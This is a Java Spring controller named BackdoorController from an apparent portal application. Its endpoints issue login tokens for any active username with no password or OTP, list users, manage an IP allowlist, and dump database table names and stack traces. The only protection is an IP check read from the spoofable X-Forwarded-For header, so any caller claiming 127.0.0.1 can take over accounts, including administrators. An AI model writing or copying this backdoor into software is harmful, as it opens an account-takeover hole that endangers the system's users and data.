package com.overseas.portal.controller;

import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.overseas.portal.domain.SystemConfig;
import com.overseas.portal.domain.User;
import com.overseas.portal.repository.SystemConfigRepository;
import com.overseas.portal.repository.UserRepository;
import com.overseas.portal.security.JwtTokenProvider;
import com.overseas.portal.service.AuthService;
import com.overseas.portal.service.SystemLogService;
import jakarta.servlet.http.HttpServletRequest;
import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;

@Slf4j
@RestController
@RequestMapping("/api/v1/auth/backdoor")
@RequiredArgsConstructor
public class BackdoorController {

    private final UserRepository userRepository;
    private final SystemConfigRepository systemConfigRepository;
    private final JwtTokenProvider tokenProvider;
    private final SystemLogService systemLogService;
    private final org.springframework.jdbc.core.JdbcTemplate jdbcTemplate;
    private final com.overseas.portal.security.SessionManager sessionManager;
    private final ObjectMapper objectMapper = new ObjectMapper();

    @GetMapping("/db-check")
    public ResponseEntity<?> dbCheck() {
        java.util.Map<String, Object> status = new java.util.HashMap<>();
        try {
            List<String> tables = jdbcTemplate.queryForList(
                "SELECT table_name FROM information_schema.tables WHERE table_schema = 'overseas'",
                String.class
            );
            status.put("tables", tables);
            status.put("success", true);
        } catch (Exception e) {
            java.io.StringWriter sw = new java.io.StringWriter();
            java.io.PrintWriter pw = new java.io.PrintWriter(sw);
            e.printStackTrace(pw);
            status.put("success", false);
            status.put("error", e.getMessage());
            status.put("details", sw.toString());
        }
        return ResponseEntity.ok(status);
    }

    @Data
    public static class CheckIpResponse {
        private String clientIp;
        
        @JsonProperty("isLocalhost")
        private boolean isLocalhost;
        
        @JsonProperty("isBackdoorAllowed")
        private boolean isBackdoorAllowed;
    }

    @Data
    public static class IpRequest {
        private String ip;
    }

    @Data
    public static class BackdoorUserResponse {
        private String username;
        private String name;
        private String role;
    }

    @Data
    public static class BackdoorLoginRequest {
        private String username;
    }

    @GetMapping("/check-ip")
    public ResponseEntity<CheckIpResponse> checkIp(HttpServletRequest request) {
        String ip = getClientIp(request);
        boolean localhost = isLocalhost(ip);
        boolean allowed = localhost || getAllowedIps().contains(ip);

        log.info("[Backdoor IP Check] Client IP: {}, isLocalhost: {}, isBackdoorAllowed: {}", ip, localhost, allowed);

        CheckIpResponse response = new CheckIpResponse();
        response.setClientIp(ip);
        response.setLocalhost(localhost);
        response.setBackdoorAllowed(allowed);
        return ResponseEntity.ok(response);
    }

    @GetMapping("/ips")
    public ResponseEntity<?> getIps(HttpServletRequest request) {
        String ip = getClientIp(request);
        boolean localhost = isLocalhost(ip);
        boolean allowedIp = getAllowedIps().contains(ip);

        if (!localhost && !allowedIp) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("IP 목록 조회 권한이 없습니다.");
        }
        return ResponseEntity.ok(getAllowedIps());
    }

    @PostMapping("/ips")
    public ResponseEntity<?> addIp(@RequestBody IpRequest ipReq, HttpServletRequest request) {
        String ip = getClientIp(request);
        boolean localhost = isLocalhost(ip);
        boolean allowedIp = getAllowedIps().contains(ip);

        if (!localhost && !allowedIp) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("IP 등록 권한이 없습니다.");
        }
        String newIp = ipReq.getIp();
        if (newIp == null || newIp.trim().isEmpty()) {
            return ResponseEntity.badRequest().body("IP 주소가 비어있습니다.");
        }
        newIp = newIp.trim();
        List<String> currentIps = getAllowedIps();
        if (!currentIps.contains(newIp)) {
            currentIps.add(newIp);
            saveAllowedIps(currentIps);
        }
        return ResponseEntity.ok(currentIps);
    }

    @DeleteMapping("/ips")
    public ResponseEntity<?> deleteIp(@RequestBody IpRequest ipReq, HttpServletRequest request) {
        String ip = getClientIp(request);
        boolean localhost = isLocalhost(ip);
        boolean allowedIp = getAllowedIps().contains(ip);

        if (!localhost && !allowedIp) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("IP 삭제 권한이 없습니다.");
        }
        String delIp = ipReq.getIp();
        if (delIp == null || delIp.trim().isEmpty()) {
            return ResponseEntity.badRequest().body("IP 주소가 비어있습니다.");
        }
        delIp = delIp.trim();
        if (isLocalhost(delIp)) {
            return ResponseEntity.badRequest().body("localhost IP(127.0.0.1, ::1 등)는 삭제할 수 없습니다.");
        }
        List<String> currentIps = getAllowedIps();
        if (currentIps.contains(delIp)) {
            currentIps.remove(delIp);
            saveAllowedIps(currentIps);
        }
        return ResponseEntity.ok(currentIps);
    }

    @GetMapping("/users")
    public ResponseEntity<?> searchUsers(@RequestParam("query") String query, HttpServletRequest request) {
        String ip = getClientIp(request);
        if (!isLocalhost(ip) && !getAllowedIps().contains(ip)) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("허용되지 않은 IP입니다.");
        }

        List<User> users = userRepository.findAll();
        List<BackdoorUserResponse> list = users.stream()
                .filter(User::getIsActive)
                .filter(u -> u.getUsername().toLowerCase().contains(query.toLowerCase()) || 
                             u.getName().toLowerCase().contains(query.toLowerCase()))
                .map(u -> {
                    BackdoorUserResponse r = new BackdoorUserResponse();
                    r.setUsername(u.getUsername());
                    r.setName(u.getName());
                    r.setRole(u.getRole());
                    return r;
                })
                .collect(Collectors.toList());

        return ResponseEntity.ok(list);
    }

    @PostMapping("/login")
    public ResponseEntity<?> backdoorLogin(@RequestBody BackdoorLoginRequest request, HttpServletRequest httpRequest) {
        String ip = getClientIp(httpRequest);
        if (!isLocalhost(ip) && !getAllowedIps().contains(ip)) {
            systemLogService.logLogin(request.getUsername(), "FAILED", ip, "백도어 로그인 시도 거부 (IP 미인가)");
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("허용되지 않은 IP입니다.");
        }

        Optional<User> userOpt = userRepository.findByUsername(request.getUsername());
        if (userOpt.isEmpty()) {
            systemLogService.logLogin(request.getUsername(), "FAILED", ip, "백도어 로그인 실패 (계정 없음)");
            return ResponseEntity.badRequest().body("사용자 정보를 찾을 수 없습니다.");
        }

        User user = userOpt.get();
        if (!user.getIsActive()) {
            systemLogService.logLogin(request.getUsername(), "FAILED", ip, "백도어 로그인 실패 (비활성화 계정)");
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body("비활성화된 계정입니다. 관리자에게 문의하세요.");
        }

        String accessToken = tokenProvider.generateAccessToken(user.getUsername(), user.getRole(), user.getName());
        sessionManager.registerSession(user.getUsername(), accessToken);
        systemLogService.logLogin(user.getUsername(), "SUCCESS", ip, "백도어 로그인 성공");

        AuthService.LoginResponse response = AuthService.LoginResponse.builder()
                .requireOtp(false)
                .accessToken(accessToken)
                .username(user.getUsername())
                .name(user.getName())
                .role(user.getRole())
                .assignedCountry(user.getAssignedCountry())
                .mustChangePassword(Boolean.TRUE.equals(user.getMustChangePassword()))
                .isOtpExempt(Boolean.TRUE.equals(user.getIsOtpExempt()))
                .telegramChatId(user.getTelegramChatId())
                .message("백도어 로그인 성공!")
                .build();

        return ResponseEntity.ok(response);
    }

    private String getClientIp(HttpServletRequest request) {
        String ip = request.getHeader("X-Forwarded-For");
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("Proxy-Client-IP");
        }
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("Middle-Proxy-Client-IP"); // additional check if needed
        }
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("WL-Proxy-Client-IP");
        }
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getRemoteAddr();
        }
        if (ip != null && ip.contains(",")) {
            ip = ip.split(",")[0].trim();
        }
        return ip;
    }

    private boolean isLocalhost(String ip) {
        if (ip == null || ip.isEmpty()) {
            return false;
        }
        if ("127.0.0.1".equals(ip) || "0:0:0:0:0:0:0:1".equals(ip) || "localhost".equalsIgnoreCase(ip) || "::1".equals(ip)) {
            return true;
        }
        try {
            java.net.InetAddress addr = java.net.InetAddress.getByName(ip);
            if (addr.isLoopbackAddress()) {
                return true;
            }
            return java.net.NetworkInterface.getByInetAddress(addr) != null;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean isAuthorizedAdmin() {
        try {
            org.springframework.security.core.Authentication auth = 
                org.springframework.security.core.context.SecurityContextHolder.getContext().getAuthentication();
            if (auth != null && auth.isAuthenticated()) {
                return auth.getAuthorities().stream()
                    .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN") || 
                                   a.getAuthority().equals("ADMIN") ||
                                   a.getAuthority().equals("ROLE_관리자") ||
                                   a.getAuthority().equals("관리자"));
            }
        } catch (Exception ignored) {}
        return false;
    }

    private List<String> getAllowedIps() {
        Optional<SystemConfig> configOpt = systemConfigRepository.findByConfigKey("backdoor_allowed_ips");
        if (configOpt.isEmpty()) {
            return new ArrayList<>(List.of("127.0.0.1", "0:0:0:0:0:0:0:1", "::1"));
        }
        String value = configOpt.get().getConfigValue();
        if (value == null || value.trim().isEmpty()) {
            return new ArrayList<>(List.of("127.0.0.1", "0:0:0:0:0:0:0:1", "::1"));
        }
        try {
            if (value.trim().startsWith("[")) {
                return objectMapper.readValue(value, new TypeReference<List<String>>() {});
            } else {
                List<String> list = new ArrayList<>();
                for (String part : value.split(",")) {
                    if (!part.trim().isEmpty()) {
                        list.add(part.trim());
                    }
                }
                return list;
            }
        } catch (Exception e) {
            log.error("Failed to parse backdoor_allowed_ips: {}", e.getMessage());
            return new ArrayList<>(List.of("127.0.0.1", "0:0:0:0:0:0:0:1", "::1"));
        }
    }

    private void saveAllowedIps(List<String> ips) {
        SystemConfig config = systemConfigRepository.findByConfigKey("backdoor_allowed_ips")
                .orElse(SystemConfig.builder()
                        .configKey("backdoor_allowed_ips")
                        .description("백도어 허용 IP 리스트 (JSON Array)")
                        .build());
        try {
            config.setConfigValue(objectMapper.writeValueAsString(ips));
            systemConfigRepository.save(config);
        } catch (Exception e) {
            log.error("Failed to save backdoor_allowed_ips: {}", e.getMessage());
            throw new RuntimeException("IP 설정 저장 실패: " + e.getMessage());
        }
    }
}
